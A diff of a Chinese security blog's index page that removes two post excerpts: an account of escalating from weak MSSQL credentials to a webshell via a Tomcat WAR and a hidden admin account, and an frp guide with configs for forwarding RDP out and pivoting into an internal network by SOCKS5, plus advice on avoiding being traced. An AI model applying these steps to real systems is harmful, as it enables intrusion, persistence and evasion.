@@ -484,40 +484,18 @@
 
       
         
-          
-            <h3 id="记一次mssql权限提升"><a href="#记一次mssql权限提升" class="headerlink" title="记一次mssql权限提升"></a>记一次mssql权限提升</h3><h4 id="前"><a href="#前" class="headerlink" title="前"></a>前</h4><p>这次权限提升的目标机器是一台内网的windows，互联网边界的windows权限已经拿到，在代理搭建好后，使用扫描器扫描内网，发现这台windows存在Mssql弱口令。</p>
+          <h3 id="记一次mssql权限提升"><a href="#记一次mssql权限提升" class="headerlink" title="记一次mssql权限提升"></a>记一次mssql权限提升</h3><h4 id="前"><a href="#前" class="headerlink" title="前"></a>前</h4><p>这次权限提升的目标机器是一台内网的windows，互联网边界的windows权限已经拿到，在代理搭建好后，使用扫描器扫描内网，发现这台windows存在Mssql弱口令。</p>
 <p><img src="/2021/07/05/mssql_elevation/mssql_pass.png" alt="mssqlpass"></p>
 <p>使用数据库工具进行连接后，尝试执行系统命令查看权限：</p>
 <p><img src="/2021/07/05/mssql_elevation/mssql_whoami.png" alt="mssqlpass"></p>
 <p>发现权限非管理员权限，无法进行添加用户等操作。</p>
-<p>尝试写入一句话木马，但是落地就被查杀，免杀大马又太大，不太方便写入，只好另寻他法。</p>
-<p>在进行信息搜集时，发现目标主机为Windows Server2008，开启了tomcat的服务，可以访问其控制台界面。</p>
-<p>此时的思路便是利用数据库权限读取tomcat的配置文件，获取到控制台账号密码后，利用tomcat部署含有webshell文件的war包，从而拿到webshell权限，然后再尝试提升管理员权限。</p>
-<h4 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h4><p>由于目标机器文件系统复杂，且tomcat未安装在默认路径，采用逐个硬盘搜索的方法来找网站根目录。</p>
-<p>访问tomcat页面，选取一个web文件，依据其文件名在硬盘中进行搜索，最后搜索到其根目录。</p>
-<p>然后在根目录下查找tomcat的tomcat-users.xml配置文件，因为账户密码一般是在这个文件中进行配置。</p>
-<p><img src="/2021/07/05/mssql_elevation/tomcatusers.png" alt="tomcatusers"></p>
-<h4 id="上传含有webshell的war包"><a href="#上传含有webshell的war包" class="headerlink" title="上传含有webshell的war包"></a>上传含有webshell的war包</h4><p>获取到tomcat账户后，登录tomcat后台：</p>
-<p><img src="/2021/07/05/mssql_elevation/tomcatmanager.png" alt="war"></p>
-<p>发现可以直接通过war包部署项目，于是尝试构造war包。</p>
-<p>按照网上的教程，直接将webshell文件打包，发现部署后，无法访问，然后从昊总那里白嫖了一个免杀webshell-war包，部署后能够成功访问，拿到webshell权限。</p>
-<p>从下图这里选择war包并部署：</p>
-<p><img src="/2021/07/05/mssql_elevation/tomcatdeploy.png" alt="war"></p>
-<p>部署后在app管理界面可以看到新增了一个项目：</p>
-<p><img src="/2021/07/05/mssql_elevation/tomcatapp.png" alt="war"></p>
-<p>于是想搞清楚直接将webshell打包后部署为什么无法访问，尝试将免杀war包解包，发现其中还有一些配置文件：</p>
-<p><img src="/2021/07/05/mssql_elevation/war.png" alt="war"></p>
-<p>猜测可能是因为缺少了配置文件，导致部署后无法访问，当然也可能是由于木马落地被查杀。</p>
-<p>对jsp文件打包的方法有两种，可以直接将想要打包的文件压缩成zip格式，然后将后缀修改为war或者使用以下命令：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar -cvf test.war ./      </span><br><span class="line"><span class="meta">#</span><span class="bash"> 将当前文件夹下所有文件压缩打包成test.war文件</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="获取webshell权限后提权"><a href="#获取webshell权限后提权" class="headerlink" title="获取webshell权限后提权"></a>获取webshell权限后提权</h4><p>我直接上传了一个大马，这次运气非常好，tomcat的执行权限是管理员权限，也就无需再次提权。</p>
-<p>如果不是管理员权限，则需要尝试使用内核提权漏洞进行提权。由于互联网边界的windows型号和这台windows相同，而且所打补丁也相同，适用于互联网边界windows的内核提权漏洞ms15-051，经过测试，在这台机器上也适用。</p>
-<p>提升至管理员权限后，使用cmd命令新增一个隐藏管理员账户，然后使用代理将3389端口反向代理出来或者直接使用互联网边界windows进行远程连接，以方便进行进一步攻击。</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/07/05/mssql_elevation/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -656,8 +634,7 @@
 
       
         
-          
-            <h3 id="frp用于内网的代理转发"><a href="#frp用于内网的代理转发" class="headerlink" title="frp用于内网的代理转发"></a>frp用于内网的代理转发</h3><h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><p>frp是一个常见的内网穿透工具。内网穿透，即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。</p>
+          <h3 id="frp用于内网的代理转发"><a href="#frp用于内网的代理转发" class="headerlink" title="frp用于内网的代理转发"></a>frp用于内网的代理转发</h3><h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><p>frp是一个常见的内网穿透工具。内网穿透，即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。</p>
 <p>UDP 内网穿透的实质是利用路由器上的NAT 系统。NAT 是一种将私有（保留）地址转化为合法IP地址的转换技术，它被广泛应用于各种类型 Internet 接入方式和各种类型的网络中。NAT可以完成重用地址，并且对于内部的网络结构可以实现对外隐蔽。</p>
 <p>而在内网中，面对内网中不出网的机器，攻击者在外网无法直接访问到，通过frp进行代理，即可实现直接访问。</p>
 <h4 id="frp的工作模式"><a href="#frp的工作模式" class="headerlink" title="frp的工作模式"></a>frp的工作模式</h4><p>frp支持很多种协议，包括tcp、udp、http、https、socks等等，当然也可以实现端口对端口的转发。</p>
@@ -665,41 +642,13 @@
 <p><img src="/2021/07/05/frp/ini.png" alt="1"></p>
 <p>一般启用精简配置文件就可以。</p>
 <p>下面以两个典型为例：</p>
-<h5 id="端口对端口转发"><a href="#端口对端口转发" class="headerlink" title="端口对端口转发"></a>端口对端口转发</h5><p>以互联网边界的某台windows为例，它的3389端口无法直接被访问到（可能是有网络策略或者防火墙策略），如果拿到了该windows的管理员权限，新增了隐藏账户，但是无法远程连接进行操作时，就可以采用端口对端口的转发，将该windows的3389端口转发到某台公网服务器的任意端口。</p>
-<p>以下是操作步骤：</p>
-<p>在有公网IP的服务器上修改frps.ini配置文件：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span>  <span class="comment">#此端口提供给目标windwos，该windows通过这个端口将其3389端口转发出来</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dashboard_port</span>=<span class="number">7503</span> <span class="comment">#这个是frp的日志系统，设置好开放的端口及用户名密码后，访问该端口可以查看相关的流量转发情况</span></span><br><span class="line"><span class="attr">dashboard_user</span>=adm1n1</span><br><span class="line"><span class="attr">dashboard_pwd</span>=admin0701</span><br></pre></td></tr></table></figure>
-
-<p>修改好后，启动frps服务，用 <code>-c</code> 指定配置文件：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
-
-<p>以上完成后，服务器端的准备已经完成。</p>
-<p>在windows机器上下载好frp后，修改frpc.ini配置文件：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">39</span>.XXX.XXX.XXX <span class="comment">#公网服务器的IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#在frps.ini文件中服务器提供的端口</span></span><br><span class="line"></span><br><span class="line"><span class="section">[3389]</span> <span class="comment">#这个名字可以任取</span></span><br><span class="line"><span class="attr">type</span> = tcp <span class="comment">#指定协议</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">3389</span> <span class="comment">#指定本机待转发的端口</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">3389</span> <span class="comment">#指定转发到公网服务器上的端口，不一定要是3389，其他端口亦可以</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>修改好后，启动frpc服务，用 <code>-c</code> 指定配置文件：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
-
-<p>完成后，访问公网服务器的IP:3389即可访问到目标windows的3389端口。</p>
-<h5 id="socks5转发"><a href="#socks5转发" class="headerlink" title="socks5转发"></a>socks5转发</h5><p>在获取了互联网边界的机器的权限后，我们想要对其内网进行横向攻击，此时需借助这台互联网边界的机器，将我们的所有流量转发至其内网当中，需要用到的工具有frp和proxifier。</p>
-<p>在我们的公网服务器上修改frps.ini配置文件：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">bind_port</span> = <span class="number">7001</span>  <span class="comment">#此端口提供给目标windwos，我们的流量将通过该端口，从公网服务器转发到目标windows，进而转发至内网</span></span><br><span class="line"></span><br><span class="line"><span class="attr">dashboard_port</span>=<span class="number">7504</span> <span class="comment">#这个是frp的日志系统，设置好开放的端口及用户名密码后，访问该端口可以查看相关的流量转发情况</span></span><br><span class="line"><span class="attr">dashboard_user</span>=adm1n1</span><br><span class="line"><span class="attr">dashboard_pwd</span>=admin0701</span><br></pre></td></tr></table></figure>
-
-<p>配置文件和端对端转发类似，实际上都只是提供一个端口用于服务器和目标windows流量传输。</p>
-<p>修改好后，启动frps服务，用 <code>-c</code> 指定配置文件：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
-
-<p>以上完成后，服务器端的准备已经完成。</p>
-<p>在目标windows上修改配置文件frpc.ini：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">39</span>.xxx.xxx.xxx</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7001</span></span><br><span class="line"><span class="attr">tls_enable</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">pool_count</span> = <span class="number">5</span></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">46075</span> <span class="comment">#设置在公网服务器上对外开放的代理端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5 <span class="comment">#指定socks5模块</span></span><br><span class="line"><span class="attr">plugin_user</span> = admin <span class="comment">#socks5认证信息</span></span><br><span class="line"><span class="attr">plugin_passwd</span> = <span class="number">112233</span>admin <span class="comment">#socks5认证信息</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>修改好后，启动frpc服务，用 <code>-c</code> 指定配置文件：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
-
-<p>此时，在我们的个人PC上，使用proxifier走socks5://admin:<a href="mailto:&#x31;&#x31;&#50;&#x32;&#x33;&#51;&#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#51;&#x39;&#46;&#x78;&#120;&#x78;&#x2e;&#120;&#x78;&#x78;&#x2e;&#120;&#120;&#120;">&#x31;&#x31;&#50;&#x32;&#x33;&#51;&#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#51;&#x39;&#46;&#x78;&#120;&#x78;&#x2e;&#120;&#x78;&#x78;&#x2e;&#120;&#120;&#120;</a>:46075的代理，即可访问到windows所在的内网环境。</p>
-<p>注意要避免自己PC上其他应用的流量也走代理进入内网，从而留下可能被溯源的痕迹。</p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/07/05/frp/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
